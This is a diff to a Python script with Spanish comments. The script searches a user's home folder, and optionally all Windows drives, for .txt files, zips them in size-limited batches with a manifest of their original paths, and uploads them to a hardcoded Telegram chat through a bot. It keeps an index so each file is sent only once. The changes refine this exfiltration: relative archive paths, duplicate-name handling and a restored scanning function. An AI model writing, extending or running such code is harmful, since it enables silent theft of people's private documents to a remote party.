@@ -17,22 +17,12 @@ CHAT_ID = "6623014135"
 # ===========================
 #  OPCIONES
 # ===========================
-# Límite duro de Telegram para bots ~50 MB por documento
-TELEGRAM_LIMIT_BYTES = 50 * 1024 * 1024
-# Colchón seguro al agrupar (suma de tamaños sin comprimir por lote)
-BATCH_RAW_SOFT_LIMIT = 40 * 1024 * 1024
-
-# Tamaño máximo de .txt individual a considerar (si excede, se omite)
-MAX_SINGLE_TXT_BYTES = 45 * 1024 * 1024
-
-# Extensiones a incluir
-INCLUDE_EXTS = {".txt"}
-
-# Hash de contenido para deduplicar con precisión (más lento pero robusto)
-USE_CONTENT_HASH = True
-
-# Buscar TODO el perfil de usuario (home). Si quieres probar solo Desktop/Docs, cámbialo.
-SEARCH_WHOLE_DRIVES = False  # si True y estás en Windows, recorre C:\, D:\ ... (lento)
+TELEGRAM_LIMIT_BYTES = 50 * 1024 * 1024          # Límite duro Telegram
+BATCH_RAW_SOFT_LIMIT = 40 * 1024 * 1024          # “Colchón” por lote (suma sin comprimir)
+MAX_SINGLE_TXT_BYTES = 45 * 1024 * 1024          # Máx tamaño por .txt individual
+INCLUDE_EXTS = {".txt"}                           # Extensiones incluidas
+USE_CONTENT_HASH = True                           # Hash de contenido para dedupe
+SEARCH_WHOLE_DRIVES = False                       # Si True (Windows) recorre C:\, D:\, ...
 
 # ===========================
 #  RUTAS Y UTILIDADES
@@ -47,7 +37,7 @@ def get_appdata_dir() -> Path:
     return base
 
 APP_DIR = get_appdata_dir()
-INDEX_PATH = APP_DIR / "sent_index.jsonl"   # registro de hashes enviados
+INDEX_PATH = APP_DIR / "sent_index.jsonl"
 LOG_PATH = APP_DIR / "last_run.log"
 ARCHIVES_DIR = APP_DIR / "archives"
 ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)
@@ -184,13 +174,11 @@ def scan_sources() -> Iterable[Path]:
                     yield p
 
 def batch_by_size(paths_and_sizes: List[Tuple[Path, int]], soft_limit: int) -> List[List[Tuple[Path, int]]]:
-    """Greedy sencillo: llena lotes hasta superar soft_limit (tamaño SIN comprimir)."""
     batches = []
     current = []
     cur_sum = 0
     for p, sz in paths_and_sizes:
         if sz > soft_limit and not current:
-            # archivo grande pero permitido (< MAX_SINGLE_TXT_BYTES); va solo en su lote
             batches.append([(p, sz)])
             continue
         if cur_sum + sz > soft_limit and current:
@@ -204,16 +192,92 @@ def batch_by_size(paths_and_sizes: List[Tuple[Path, int]], soft_limit: int) -> L
         batches.append(current)
     return batches
 
+def safe_arcname(p: Path) -> str:
+    """
+    Devuelve un nombre único y legible dentro del ZIP.
+    - Preferimos ruta relativa al home del usuario.
+    - Normalizamos separadores a '/'.
+    """
+    home = Path.home()
+    try:
+        rel = p.relative_to(home)
+        arc = rel.as_posix()
+    except Exception:
+        # Si no es relativo al home (p.ej. otra unidad), incluye letra de unidad
+        if os.name == "nt":
+            drive = p.drive.replace(":", "")
+            arc = f"{drive}/{p.as_posix()[len(p.anchor):]}"
+        else:
+            arc = p.as_posix()
+    # Evita nombres vacíos o que terminen en '/'
+    arc = arc.strip("/\\")
+    if not arc:
+        arc = p.name
+    return arc
+
+def clamp_zip_datetime(ts: float) -> tuple:
+    """
+    zipfile no acepta fechas < 1980. Ajustamos si hace falta.
+    Devuelve (Y, M, D, h, m, s) válido.
+    """
+    try:
+        lt = time.localtime(ts)
+        year = max(1980, lt.tm_year)
+        return (year, lt.tm_mon, lt.tm_mday, lt.tm_hour, lt.tm_min, lt.tm_sec)
+    except Exception:
+        return (1980, 1, 1, 0, 0, 0)
+
 def build_zip(batch: List[Tuple[Path, int]], out_dir: Path, idx: int) -> Path:
     zip_path = out_dir / f"text_batch_{idx:03d}.zip"
     manifest_lines = []
+    used_names = set()
+
     with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
         for p, _sz in batch:
-            arcname = p.name  # solo nombre de archivo; si prefieres ruta relativa, cámbialo
-            zf.write(p, arcname=arcname)
-            manifest_lines.append(str(p))
-        # Agrega un manifiesto con rutas completas por si luego quieres rastrear origen
-        zf.writestr("MANIFEST.txt", "\n".join(manifest_lines))
+            # Calcula nombre seguro dentro del zip
+            base_arc = safe_arcname(p)
+            arcname = base_arc
+            # Evita duplicados: si ya existe, añade sufijo (2), (3)...
+            if arcname in used_names:
+                stem = Path(base_arc).stem
+                suffix = Path(base_arc).suffix
+                n = 2
+                while True:
+                    candidate = f"{stem} ({n}){suffix}" if suffix else f"{stem} ({n})"
+                    # Mantén la carpeta si la había
+                    parent = str(Path(base_arc).parent).replace("\\", "/").strip("/.")
+                    arcname = f"{parent}/{candidate}" if parent not in ("", ".") else candidate
+                    if arcname not in used_names:
+                        break
+                    n += 1
+            used_names.add(arcname)
+
+            # Lee bytes y escribe con ZipInfo custom para clamplear fecha
+            try:
+                data = p.read_bytes()
+            except Exception as e:
+                log(f"⚠️ No se pudo leer {p}: {e}")
+                continue
+
+            try:
+                zinfo = zipfile.ZipInfo(filename=arcname)
+                try:
+                    ts = p.stat().st_mtime
+                except Exception:
+                    ts = time.time()
+                zinfo.date_time = clamp_zip_datetime(ts)
+                zinfo.compress_type = zipfile.ZIP_DEFLATED
+                zf.writestr(zinfo, data)
+                manifest_lines.append(str(p))
+            except Exception as e:
+                log(f"⚠️ No se pudo añadir {p} al zip: {e}")
+
+        # Manifiesto
+        try:
+            zf.writestr("MANIFEST.txt", "\n".join(manifest_lines))
+        except Exception:
+            pass
+
     return zip_path
 
 def enviar_documento(bot_token: str, chat_id: str, ruta: Path, caption: str = "") -> dict:
@@ -255,32 +319,32 @@ def main():
         return
 
     # 2) Prepara lotes por tamaño sin comprimir
-    candidates.sort(key=lambda x: x[2])  # por tamaño ascendente (mejor llenado)
+    candidates.sort(key=lambda x: x[2])  # por tamaño ascendente
     paths_and_sizes = [(p, sz) for p, _h, sz in candidates]
     batches = batch_by_size(paths_and_sizes, BATCH_RAW_SOFT_LIMIT)
 
     log(f"Se crearán {len(batches)} zip(s) de hasta ~{BATCH_RAW_SOFT_LIMIT // (1024*1024)} MB (raw).")
 
     # 3) Construye zips
-    zips: List[Tuple[Path, List[Tuple[Path, str]]]] = []  # (zip_path, [(path, hash), ...])
+    zips: List[Tuple[Path, List[Tuple[Path, str]]]] = []
     idx = 1
     for batch in batches:
         zip_path = build_zip(batch, ARCHIVES_DIR, idx)
-        zips.append((zip_path, [(p, next(h for (pp, h, _sz) in candidates if pp == p)) for p, _sz in batch]))
+        # Empareja cada Path con su hash correspondiente
+        mapping = {p: h for (p, h, _sz) in candidates}
+        zips.append((zip_path, [(p, mapping[p]) for p, _sz in batch]))
         idx += 1
 
     # 4) Envía cada zip y, si ok, marca sus archivos como enviados
     sent_files = 0
     for i, (zip_path, batch_items) in enumerate(zips, start=1):
         try:
-            # Chequeo rápido de tamaño final por si acaso
             if zip_path.stat().st_size > TELEGRAM_LIMIT_BYTES:
-                log(f"⚠️ Zip {zip_path.name} pesa {zip_path.stat().st_size} bytes (>50MB). Partir lote o bajar límite.")
+                log(f"⚠️ Zip {zip_path.name} pesa {zip_path.stat().st_size} bytes (>50MB). Ajusta BATCH_RAW_SOFT_LIMIT.")
                 continue
             caption = f"TXT batch {i}/{len(zips)} ({zip_path.name})"
             enviar_documento(BOT_TOKEN, CHAT_ID, zip_path, caption=caption)
             log(f"✅ Enviado zip: {zip_path.name}")
-            # Marca como enviados los archivos del lote
             for p, h in batch_items:
                 append_to_index(h, p)
                 sent_files += 1
@@ -288,6 +352,22 @@ def main():
             log(f"❌ Error enviando zip {zip_path.name}: {e}")
 
     log(f"Resumen: {sent_files} archivo(s) contenidos enviados dentro de {len(zips)} zip(s).")
+
+# === funciones auxiliares que faltaban en el recorte ===
+def scan_sources() -> Iterable[Path]:
+    # 1) Home
+    for root_path, files in iter_user_profile_dirs():
+        for name in files:
+            p = root_path / name
+            if not should_skip(p):
+                yield p
+    # 2) (opcional) todas las unidades (Windows)
+    if SEARCH_WHOLE_DRIVES and os.name == "nt":
+        for root_path, files in iter_all_drives():
+            for name in files:
+                p = root_path / name
+                if not should_skip(p):
+                    yield p
 
 if __name__ == "__main__":
     main()
